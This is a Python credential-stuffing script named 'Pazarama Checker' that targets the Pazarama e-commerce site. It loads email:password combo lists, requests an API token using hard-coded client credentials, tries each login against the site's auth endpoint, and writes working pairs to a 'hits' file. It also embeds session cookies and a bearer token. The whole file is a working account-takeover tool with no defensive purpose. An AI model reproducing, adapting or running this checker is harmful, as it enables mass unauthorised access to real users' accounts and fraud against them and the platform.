import requests, os, time, pyfiglet, uuid
#────────────────#
sari = '\033[1;33m'
kirmizi = '\033[1;31m'
yesil = '\033[2;32m'
beyaz = '\033[1;97m'
pembe = '\033[2;35m'
mavi = '\x1b[1;36m'
mor = "\x1b[1;35m"
g = str(uuid.uuid4())
#────────────────#
def pazarama_token():
    headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",'Accept': "application/json",'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",'x-deviceid': "10606980-7e56-4f03-8438-ca3b464b7be7",'x-companycode': "1",'sec-ch-ua-mobile': "?1",'authorization': "Basic cGF6YXJhbWFpZGVudGl0eS5wcm9kdWN0aW9uLndlYmNsaWVudC5jbGllbnRfY3JlZGVudGlhbHM6YWM0OGZkZmEtY2YwMy00ZGRiLWE4ZTEtOTBjYjQ1NGZlZWUx",'x-channelcode': "10",'sec-ch-ua-platform': "\"Android\"",'origin': "https://account.pazarama.com",'sec-fetch-site': "same-site",'sec-fetch-mode': "cors",'sec-fetch-dest': "empty",'referer': "https://account.pazarama.com/giris?ReturnUrl=https://auth.pazarama.com/connect/authorize/callback?protocol=oauth2%26response_type=code%26client_id=pazarama.production.mobilewebclient.authorization_code%26redirect_uri=https%253A%252F%252Fwww.pazarama.com%252Fcallback%26scope=openid%2520profile%2520email%2520offline_access%2520pazaramaweb.fullaccess%26state=oma3RwfsZX%26code_challenge_method=S256%26prompt=login%26guest_id=315d4a33-6a62-43eb-869c-01ef3c59c4e5%26channel_code=10%26X-ChannelCode=10%26X-CompanyCode=1%26X-DeviceId=10606980-7e56-4f03-8438-ca3b464b7be7%26code_challenge=48EWncq6AO3D6EwPXPMwij_ihcQ3ERzS1TJ66J0VHGM%26response_mode=query%26suppressed_prompt=login",'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"}
    payload = {'grant_type': "client_credentials",'scope': "api.identitytokenprovider.connect api.identityuser.user"}
    response = requests.post('https://auth.pazarama.com/connect/token', data=payload, headers=headers)
    if "İstek adet limiti aşıldı" not in response.text:
        return response.json()["access_token"]
    else:
        return False
def pazarama_giris(email, password, token):
    headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",'cache-control': "max-age=0",'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",'sec-ch-ua-mobile': "?1",'sec-ch-ua-platform': "\"Android\"",'upgrade-insecure-requests': "1",'origin': "https://account.pazarama.com",'sec-fetch-site': "same-site",'sec-fetch-mode': "navigate",'sec-fetch-user': "?1",'sec-fetch-dest': "document",'referer': "https://account.pazarama.com/giris?ReturnUrl=https://auth.pazarama.com/connect/authorize/callback?protocol=oauth2%26response_type=code%26client_id=pazarama.production.mobilewebclient.authorization_code%26redirect_uri=https%253A%252F%252Fwww.pazarama.com%252Fcallback%26scope=openid%2520profile%2520email%2520offline_access%2520pazaramaweb.fullaccess%26state=oma3RwfsZX%26code_challenge_method=S256%26prompt=login%26guest_id=315d4a33-6a62-43eb-869c-01ef3c59c4e5%26channel_code=10%26X-ChannelCode=10%26X-CompanyCode=1%26X-DeviceId=10606980-7e56-4f03-8438-ca3b464b7be7%26code_challenge=48EWncq6AO3D6EwPXPMwij_ihcQ3ERzS1TJ66J0VHGM%26response_mode=query%26suppressed_prompt=login",'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",'Cookie': "_ga=GA1.1.1286714277.1743107302; _fbp=fb.1.1743107304656.585477292293760440; cookie_consent_v2=true; cookie_control_enabled_cookies=islevsellik-cerezleri,pazarlama-hedefleme-cerezleri,analitik-performans-cerezleri; _tt_enable_cookie=1; _ttp=01JQXR6265K6EAR40QVWTSKB2Y_.tt.1; _ga_3WB3898Y97=GS1.1.1743681419.2.1.1743681485.56.0.746106718; cf_clearance=.OvZrH2PoxUY7OHtDn7aCFJwvvI6O4td_i6mxwwywT4-1743681493-1.2.1.1-ql3uKGQKTzSQx.n_MBL.a9FiQ7Mnl.3aSFo_cxTqfoxd2RAGZtGSwwsLOzq0QgCGi3oF.LEVlYQfkgfPtA8HvEFy9ZqWcs1s6pmB4gE.Lt3aEkHNfWSM4UrDmm_thu8AgIVPTlPS6vubD_D1gEmOagb7SZ4DbjUf0s9NmLMDVGKi4MB7ZCRYyDPYAQN_z7SXvY_NC.f5BlSJZKsxYsGSMBbqAV1seDCbAc1dNqmKS31i0yTAXYctF8i9KzaesTX.1V.H.yv9fYzNaby12_Q32_y1LL8CmpIiC_04r.zeZZZttmxxTUs86aY5Wcsqrp3ylqYX1WIOtYMXC7pYvB9zZvR8MsEsvv5RgHtSOho.SaKNczRISY3S2nIy8L7EV.9G; status={\"member\":true,\"loginStatus\":false}; user-timestamp=03/04/2025 14:58; _gcl_au=1.1.1591107902.1743107301.344272442.1743681543.1743681548; _cfuvid=EzCPEDK3cFLWQHmrffZ1h.fJIWARAB_5rgdnL2W7Jmg-1744632793529-0.0.1.1-604800000; prod_identity_auth_token=eyJhbGciOiJSUzUxMiIsImtpZCI6IjM2ODgyMyIsInR5cCI6ImF0K2p3dCJ9.eyJpc3MiOiJodHRwczovL2dpcmlzLnBhemFyYW1hLmNvbSIsIm5iZiI6MTc0NDYzMjgxNSwiaWF0IjoxNzQ0NjMyODE1LCJleHAiOjE3NDQ2MzY0MTUsInNjb3BlIjpbImFwaS5pZGVudGl0eXRva2VucHJvdmlkZXIuY29ubmVjdCIsImFwaS5pZGVudGl0eXVzZXIudXNlciJdLCJjbGllbnRfaWQiOiJwYXphcmFtYWlkZW50aXR5LnByb2R1Y3Rpb24ud2ViY2xpZW50LmNsaWVudF9jcmVkZW50aWFscyIsImp0aSI6IkEyMzAzNzhFMDc5QjMwREFDNzgwQzBGRTZEODBFMzM4In0.iSmauAi5x3TNSvtzl7BQdDHYopyv-6Xr4X9LtK1w2bFaQYXJOio_x59uhiNorg-SL-Nu0FoB2XjzWArqqZwdfP0xJRAe9g-VYKT_anZ2Lqn1nOoekknb4lm7ShE7G1PQbRKv6uq7y8WtsUDc2XM-IVSPOsurbw_6mcUBeeMmfJyEZ4xP-Op1J2SA20YcmndrguciOWlELeKiCS0LVZIQDmVVhU1W9m_qEQc1WFprbkmrQkD5LuwYSFsJhWpkzv8frJEryldHKPywYmI_WFHjKwo2jZfACIqLPQgsrVxHN7McPtrHtQ0mO8Gh_H27-U2rIwbWCcoNFngMxEvI07_l1w"}
    payload = {'Authorization': f"Bearer {token}",'X-ChannelCode': "10",'X-CompanyCode': "1",'X-DeviceId': g,'username': email,'password': password}
    response = requests.post("https://auth.pazarama.com/connect/oauth/login", data=payload,headers=headers)
    if "LOGOUT_URL" not in response.text:
        return False
    else:
        return True
def arayuz():
    font = pyfiglet.figlet_format("PAZARAMA", font="slant")
    logo = f"{mor}──────────────────────────────────────────────────────────\n{mavi}{font}\n{mor}──────────────────────────────────────────────────────────\n{kirmizi}[{sari}INFO{kirmizi}]{beyaz} Pazarama Checker / Developer SCOFİELD\n{mor}──────────────────────────────────────────────────────────"
    print(logo)    
def menu():
    arayuz()
    dosya_yolu = input(f"{kirmizi}[{sari}INPUT{kirmizi}]{beyaz} Dosya Yolu Giriniz: ")
    time.sleep(3)
    os.system("clear")
    arayuz()
    dosya_ac = open(dosya_yolu, "r").read().splitlines()
    for wizard in dosya_ac:
        email, password = wizard.strip().split(":")
        token = pazarama_token()
        if token:      
            giris = pazarama_giris(email, password, token)
            if giris:
                print(f"{kirmizi}[{yesil}HIT{kirmizi}]{yesil} ✅ Başarılı Giriş: {email}:{password}")
                with open("pazarama_hit.txt", "a") as yazdir:
                    yazdir.write(f"{email}:{password}\n")
            else:
                print(f"{kirmizi}[{sari}BAD{kirmizi}]{kirmizi} ❌ Başarısız Giriş: {email}:{password}")
        else:
            print(f"{kirmizi}[{sari}ERROR{kirmizi}]{kirmizi} ❌ Token Alınamadı.")
menu()
